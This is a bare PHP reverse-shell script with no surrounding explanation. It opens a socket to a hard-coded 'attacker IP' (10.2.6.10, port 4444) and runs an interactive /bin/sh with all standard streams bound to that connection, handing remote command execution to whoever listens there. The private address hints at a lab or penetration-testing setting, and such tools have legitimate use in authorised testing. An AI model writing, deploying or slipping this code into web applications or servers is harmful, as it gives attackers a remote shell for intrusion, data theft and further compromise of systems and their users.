<?php
set_time_limit(0);
$VERSION = "1.0";
$ip = '10.2.6.10';  // Attacker IP
$port = 4444;      // Attacker port
$sock = fsockopen($ip, $port);
if (!$sock) { die("Error: Could not connect to $ip:$port\n"); }
$shell = '/bin/sh -i';
$process = proc_open($shell, [
    0 => $sock, // stdin
    1 => $sock, // stdout
    2 => $sock  // stderr
], $pipes);
if (!is_resource($process)) { die("Error: Failed to spawn shell.\n"); }
?>
